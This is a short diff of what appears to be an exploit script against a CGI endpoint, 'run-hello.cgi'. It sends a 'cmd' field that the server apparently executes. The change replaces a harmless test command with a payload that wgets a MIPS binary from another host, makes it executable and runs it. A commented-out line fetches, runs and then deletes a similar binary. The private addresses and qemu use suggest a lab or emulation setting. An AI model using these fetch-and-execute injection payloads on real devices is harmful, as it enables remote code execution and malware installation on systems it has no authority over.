@@ -20,7 +20,7 @@ port = 80
 #cmd = 'wget http://192.168.0.99:8080/mips; chmod +x mips; ./mips; rm -rf mips;'
 
 data = {
-	'cmd':'touch /tmp/test.txt'
+	'cmd':'wget -P /tmp http://10.0.2.15:8000/mips; chmod +x /tmp/mips; qemu-mips-static /tmp/mips'
 }
 
 url = 'http://' + host + '/run-hello.cgi'
